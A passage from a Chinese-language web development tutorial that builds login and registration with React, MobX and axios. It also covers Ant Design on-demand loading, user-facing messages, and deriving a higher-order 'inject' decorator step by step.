<span style="color: #b22222;">//       </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">)</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>

<span style="color: #b22222;">// </span><span style="color: #b22222;">@observer // &#23558;react&#32452;&#20214;&#36716;&#25442;&#20026;&#21709;&#24212;&#24335;&#32452;&#20214;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">class App extends React.Component {</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">// state = {</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">//   ret:0</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">// }</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">handleClick(e) {</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">console.log('&#35843;&#29992;&#24320;&#22987;')</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">console.log(e);</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">// let ret = this.props.service.login(5); // &#21516;&#27493;&#35843;&#29992;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">// this.setState({ret});</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">this.props.service.login(2); // &#24322;&#27493;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">console.log('&#35843;&#29992;&#23436;&#25104;???')</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">render() {</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">console.log('observer render *********');</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">console.log(this.props.service.ret); // &#20351;&#29992;&#25165;&#33021;&#34987;&#35266;&#23519;&#21040;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">return &lt;div&gt;</span>
<span style="color: #b22222;">//       </span><span style="color: #b22222;">&lt;button onClick={this.handleClick.bind(this)}&gt;&#35831;&#28857;&#20987;&lt;/button&gt;&lt;br/&gt;</span>
<span style="color: #b22222;">//       </span><span style="color: #b22222;">{new Date().getTime()} &#32467;&#26524;&#26159; {this.props.service.ret}</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">&lt;/div&gt;</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">render(&lt;App  service={new Service()}/&gt;, document.getElementById('root')); </span>
</pre>
</div>

<ul class="org-ul">
<li>注意：测试时，开启Django编写的后台服务程序</li>
<li>成功登录，则跳转，否则显示错误信息。
<ul class="org-ul">
<li>浏览器访问  <a href="http://localhost:3000/login">http://localhost:3000/login</a> 输入错误和正解用户名和密码</li>
</ul></li>
</ul>
</div>
</div>
</section>
<section id="outline-container-h:355669cf-8ac0-4504-904f-44d75f34b6a0" class="outline-2">
<h2 id="h:355669cf-8ac0-4504-904f-44d75f34b6a0">前端开发-注册功能代码实现</h2>
<div class="outline-text-2" id="text-h:355669cf-8ac0-4504-904f-44d75f34b6a0">
</div>
<div id="outline-container-h:362a1e37-f984-4d6c-910f-229ca446b4a6" class="outline-3">
<h3 id="h:362a1e37-f984-4d6c-910f-229ca446b4a6">注册功能实现</h3>
<div class="outline-text-3" id="text-h:362a1e37-f984-4d6c-910f-229ca446b4a6">
<p>
在service/user.js中增加reg注册函数
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    @observable isReg = <span style="color: #008b8b;">false</span>;

    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
            }
        );
    }

    reg(username, email, password) {
        console.log(username, email, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/'</span>,
            data:{username, email, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isReg = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
            }
        );
    }
}
</pre>
</div>


<p>
修改componet/reg.js组件
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'../css/login.css'</span>;
<span style="color: #a020f0;">import</span> UserService from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">service</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Reg <span style="color: #a020f0;">extends</span> React.Component {
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">_Reg</span> <span style="color: #a0522d;">service</span>={service}/&gt;
  }
}

@observer
<span style="color: #a020f0;">class</span> _Reg <span style="color: #a020f0;">extends</span> React.Component {
  validate(pwd, confirmpwd) {
    <span style="color: #a020f0;">if</span> (pwd.value === confirmpwd.value){
      <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">true</span>;
    }<span style="color: #a020f0;">else</span>{
      pwd.focus();
      console.log(<span style="color: #8b2252;">'pwd failed'</span>)
      <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
    }

  }

  handleClick(e) {
    e.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#40664;&#35748;&#34892;&#20026;</span>
    <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">form</span> = e.target.form;
    <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">email</span>, <span style="color: #a0522d;">password</span>, <span style="color: #a0522d;">confirmpwd</span>] = form;
    <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.validate(password, confirmpwd))
      <span style="color: #008b8b;">this</span>.props.service.reg(username.value, email.value, password.value);
  }

  render() {
    console.log(<span style="color: #8b2252;">'reg render ~~~~'</span>)
    <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22914;&#26524;&#24050;&#32463;&#30331;&#24405;&#25104;&#21151;&#65292;&#23601;&#19981;&#35201;&#20877;&#27880;&#20876;&#20102;</span>
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;;
    }
    <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isReg){
      <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/login'</span> /&gt;
    }
    <span style="color: #a020f0;">return</span> (
      &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"register-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#30005;&#23376;&#37038;&#31665;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#30830;&#35748;&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#24050;&#32463;&#27880;&#20876;, </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/login'</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
    );
  }
}
</pre>
</div>

<p>
测试发现，重新登录，登录成功后，点击注册链接，没有跳转到首页，或者先注册，注册成功后，点击登录，还可以再次登录。原因是构造并使用了不同的UserServer实例。
</p>

<p>
如何使用同一个UserServer实例，在service/user.js中导出唯一的UserService实例即可，其他模块直接导入并使用这个实例即可。
</p>

<p>
修改service/user.js
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">class</span> UserService {
    <span style="color: #b22222;">//</span><span style="color: #b22222;">&#27492;&#22788;&#30465;&#30053;</span>
}
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">userService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> {userService};

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#22312;&#32452;&#20214;&#20013;&#20351;&#29992;</span>
<span style="color: #a020f0;">import</span> {userService as service} from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #b22222;">//</span><span style="color: #b22222;">const service = new UserService();  //&#21487;&#20197;&#21024;&#38500;&#20102;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:187d9f1e-0a28-40ae-b71b-2aa6e7dea296" class="outline-3">
<h3 id="h:187d9f1e-0a28-40ae-b71b-2aa6e7dea296">Ant Design</h3>
<div class="outline-text-3" id="text-h:187d9f1e-0a28-40ae-b71b-2aa6e7dea296">
<p>
Ant Design蚂蚁金服开源的React UI库。
</p>

<ul class="org-ul">
<li>官网 <a href="https://ant.design/index-cn">https://ant.design/index-cn</a></li>
<li>官方文档 <a href="https://ant.design/docs/react/introduce-cn">https://ant.design/docs/react/introduce-cn</a></li>
</ul>

<p>
安装，package.json文件已经指定了无需安装
</p>
<div class="org-src-container">
<pre class="src src-sh">npm install antd <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25110;&#32773;yarn add antd=</span>
</pre>
</div>

<p>
这里使用3版本。
</p>

<p>
指定要使用的样式
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> {List} from <span style="color: #8b2252;">'antd'</span>; <span style="color: #b22222;">//</span><span style="color: #b22222;">&#21152;&#36733;antd&#30340;&#32452;&#20214;</span>
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'antd/lib/list/style/css'</span>; <span style="color: #b22222;">//</span><span style="color: #b22222;">&#21152;&#36733;&#32452;&#20214;&#30340;&#26679;&#24335;css</span>

ReactDom.render(&lt;list /&gt;, mountNode);
</pre>
</div>

<p>
每一种组件的详细使用例子，官网都有，需要时查阅官方文档即可
</p>
</div>
<div id="outline-container-h:bd68402f-cf6f-40ef-8941-659b415f859d" class="outline-4">
<h4 id="h:bd68402f-cf6f-40ef-8941-659b415f859d">按需加载</h4>
<div class="outline-text-4" id="text-h:bd68402f-cf6f-40ef-8941-659b415f859d">
<p>
<b>按需加载，可缩小js体积</b>
</p>
<ul class="org-ul">
<li>使用 babel-plugin-import</li>
</ul>

<p>
修改 <code>.babelrc</code> 文件
</p>
<div class="org-src-container">
<pre class="src src-js">{
  <span style="color: #8b2252;">"presets"</span>: [
    <span style="color: #8b2252;">"react"</span>,
    <span style="color: #8b2252;">"env"</span>,
    <span style="color: #8b2252;">"stage-0"</span>
  ],
  <span style="color: #8b2252;">"plugins"</span>: [
    <span style="color: #8b2252;">"transform-decorators-legacy"</span>,
    <span style="color: #8b2252;">"transform-runtime"</span>,
    [<span style="color: #8b2252;">"import"</span>, {
      <span style="color: #8b2252;">"libraryName"</span>: <span style="color: #8b2252;">"antd"</span>,
      <span style="color: #8b2252;">"libraryDirectory"</span>: <span style="color: #8b2252;">"es"</span>,
      <span style="color: #8b2252;">"style"</span>: <span style="color: #008b8b;">true</span> <span style="color: #b22222;">// </span><span style="color: #b22222;">`style: true` &#20250;&#21152;&#36733; less &#25991;&#20214;</span>
    }]
  ]
}
</pre>
</div>

<p>
安装插件，重启后观察bundle.js文件大小
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt; yarn run start
        Asset     Size  Chunks                    Chunk Names
    bundle.js  7.86 MB       0  [emitted]  [big]  app

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013;&#25554;&#20214;</span>
yarn add babel-plugin-import -D

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21487;&#30475;&#21040;bundle.js&#20307;&#31215;&#26126;&#26174;&#23567;&#20102;</span>
&gt; yarn run start
        Asset     Size  Chunks                    Chunk Names
    bundle.js  2.86 MB       0  [emitted]  [big]  app
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1c887c99-a63e-44b3-95cd-0636df68945e" class="outline-4">
<h4 id="h:1c887c99-a63e-44b3-95cd-0636df68945e">信息显示</h4>
<div class="outline-text-4" id="text-h:1c887c99-a63e-44b3-95cd-0636df68945e">
<p>
页开发中，不管操作成功与否，有很多提示信息，目前信息都是控制台输出，用户看不到。
</p>

<p>
用Antd的message组件显示油耗提示信息。
</p>

<p>
service/user.js 增加信息显示
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    @observable isReg = <span style="color: #008b8b;">false</span>;

    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">window.alert(reason.msg);</span>
                message.warning(reason.msg, 8); <span style="color: #b22222;">// </span><span style="color: #b22222;">8&#31186;&#28040;&#22833;</span>
            }
        );
    }

    reg(username, email, password) {
        console.log(username, email, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/'</span>,
            data:{username, email, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isReg = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">userService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> {userService}
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:7bd98031-5ec4-443d-a7ad-60ff1c30f4fe" class="outline-2">
<h2 id="h:7bd98031-5ec4-443d-a7ad-60ff1c30f4fe">高阶组件装饰器</h2>
<div class="outline-text-2" id="text-h:7bd98031-5ec4-443d-a7ad-60ff1c30f4fe">
<p>
装饰器函数的整个演变过程如下
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">1&#32452;&#20214;&#21407;&#22411;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component{
    render() {
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">_Login</span> <span style="color: #a0522d;">service</span>={service}/&gt;
    }
}

<span style="color: #b22222;">// </span><span style="color: #b22222;">2 &#21311;&#21517;&#32452;&#20214;</span>
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Login</span> = <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component {
    render() {
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">_Login</span> <span style="color: #a0522d;">service</span>={service} /&gt;
    }
}

<span style="color: #b22222;">// </span><span style="color: #b22222;">3 &#39640;&#38454;&#32452;&#20214;, &#25552;&#21442;&#25968;</span>
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">inject</span>(<span style="color: #a0522d;">service</span>, <span style="color: #a0522d;">Comp</span>) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25552;&#20379;&#19968;&#20010;&#32452;&#20214;&#65292;&#36820;&#22238;&#19968;&#20010;&#21253;&#35013;&#23427;&#30340;&#26032;&#32452;&#20214;</span>
    <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component {
        render() {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Comp</span> <span style="color: #a0522d;">service</span>={service} /&gt;
        }
    }
}

<span style="color: #b22222;">// </span><span style="color: #b22222;">4 props</span>
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">inject</span>(<span style="color: #a0522d;">obj</span>, <span style="color: #a0522d;">Comp</span>) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25552;&#20379;&#19968;&#20010;&#32452;&#20214;&#65292;&#36820;&#22238;&#19968;&#20010;&#21253;&#35013;&#23427;&#30340;&#26032;&#32452;&#20214;</span>
    <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component {
        render() {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;
        }
    }
}

<span style="color: #b22222;">// </span><span style="color: #b22222;">5 &#26607;&#37324;&#21270;</span>
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">inject</span>(<span style="color: #a0522d;">obj</span>) {
    <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">Comp</span>) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25552;&#20379;&#19968;&#20010;&#32452;&#20214;&#65292;&#36820;&#22238;&#19968;&#20010;&#21253;&#35013;&#23427;&#30340;&#26032;&#32452;&#20214;</span>
        <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component {
            render() {
                <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;
            }
        }
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = <span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">obj</span>) {
    <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">Comp</span>) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25552;&#20379;&#19968;&#20010;&#32452;&#20214;&#65292;&#36820;&#22238;&#19968;&#20010;&#21253;&#35013;&#23427;&#30340;&#26032;&#32452;&#20214;</span>
        <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component {
            render() {
                <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;
            }
        }
    }
}

<span style="color: #b22222;">// </span><span style="color: #b22222;">5&#31661;&#22836;&#20989;&#25968;</span>
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; {
    <span style="color: #a020f0;">return</span> Comp =&gt; { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25552;&#20379;&#19968;&#20010;&#32452;&#20214;&#65292;&#36820;&#22238;&#19968;&#20010;&#21253;&#35013;&#23427;&#30340;&#26032;&#32452;&#20214;</span>
        <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component {
            render() {
                <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;
            }
        }
    }
}

<span style="color: #b22222;">//  </span><span style="color: #b22222;">&#32487;&#32493;&#31616;&#21270;&#65292;&#25481;return</span>
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; Comp =&gt;
    <span style="color: #a020f0;">class</span> <span style="color: #a020f0;">extends</span> React.Component { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#19968;&#20010;&#23436;&#25972;&#30340;&#32452;&#20214;</span>
        render() {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;
        }
    }
<span style="color: #b22222;">// </span><span style="color: #b22222;">inject(1)(&#32452;&#20214;) =&#12299;&#26032;&#32452;&#20214;</span>

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#20351;&#29992;</span>
@inject({a:1}) <span style="color: #b22222;">// </span><span style="color: #b22222;">A = inject({a:1})(A)</span>
<span style="color: #a020f0;">class</span> A <span style="color: #a020f0;">extends</span> React.Component {
    render () {
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">div</span>&gt;{<span style="color: #008b8b;">this</span>.props.a}&lt;/<span style="color: #0000ff;">div</span>&gt;
    }
}

<span style="color: #b22222;">// </span><span style="color: #b22222;">7 &#20989;&#25968;&#24335;&#32452;&#20214;&#31616;&#21270;</span>
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; Comp =&gt; {
    <span style="color: #a020f0;">return</span> props =&gt; &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;;
} 
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; Comp =&gt; props =&gt; &lt;<span style="color: #0000ff;">Comp</span> {...obj} /&gt;; 
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; Comp =&gt; props =&gt; &lt;<span style="color: #0000ff;">Comp</span> {...obj} {...props} /&gt;; 
<span style="color: #b22222;">// </span><span style="color: #b22222;">&#21547;&#20041;&#65306;inject(obj)&#35013;&#39280;&#19968;&#20010;&#32452;&#20214;&#36820;&#22238;&#19968;&#20010;&#26032;&#32452;&#20214;&#65292;&#26159;&#23545;&#21407;&#32452;&#20214;&#30340;&#21253;&#35013;&#65292;&#24182;&#27880;&#20837;props</span>

<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; Comp =&gt; props =&gt; &lt;<span style="color: #0000ff;">Comp</span> {...obj} {...props} /&gt;; 
</pre>
</div>


<p>
新建src/utils/index.js，放入以下内容
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;

<span style="color: #8b2252;">/**</span>
<span style="color: #8b2252;"> * &#27880;&#20837;&#23545;&#35937;&#32473;&#34987;&#21253;&#35013;&#32452;&#20214;&#65292;&#36820;&#22238;&#21253;&#35013;&#32452;&#20214;</span>
<span style="color: #8b2252;"> * @param {*} obj {a:100}</span>
<span style="color: #8b2252;"> * @returns </span>
<span style="color: #8b2252;"> */</span>
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">inject</span> = obj =&gt; Comp =&gt; props =&gt; &lt;<span style="color: #0000ff;">Comp</span> {...obj} {...props} /&gt;; 

<span style="color: #a020f0;">export</span> {inject};
</pre>
</div>

<p>
将登陆、注册组件装饰一下
</p>

<p>
component/reg.js修改如下：
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'../css/login.css'</span>;
<span style="color: #a020f0;">import</span> {userService as service} from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">export default class Reg extends React.Component {</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">render() {</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">return &lt;_Reg service={service}/&gt;</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>

@inject({service})
@observer
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Reg <span style="color: #a020f0;">extends</span> React.Component {
  validate(pwd, confirmpwd) {
    <span style="color: #a020f0;">if</span> (pwd.value === confirmpwd.value){
      <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">true</span>;
    }<span style="color: #a020f0;">else</span>{
      pwd.focus();
      console.log(<span style="color: #8b2252;">'pwd failed'</span>)
      <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
    }
  }

  handleClick(e) {
    e.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#40664;&#35748;&#34892;&#20026;</span>
    <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">form</span> = e.target.form;
    <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">email</span>, <span style="color: #a0522d;">password</span>, <span style="color: #a0522d;">confirmpwd</span>] = form;
    <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.validate(password, confirmpwd))
      <span style="color: #008b8b;">this</span>.props.service.reg(username.value, email.value, password.value);
  }

  render() {
    console.log(<span style="color: #8b2252;">'reg render ~~~~'</span>)
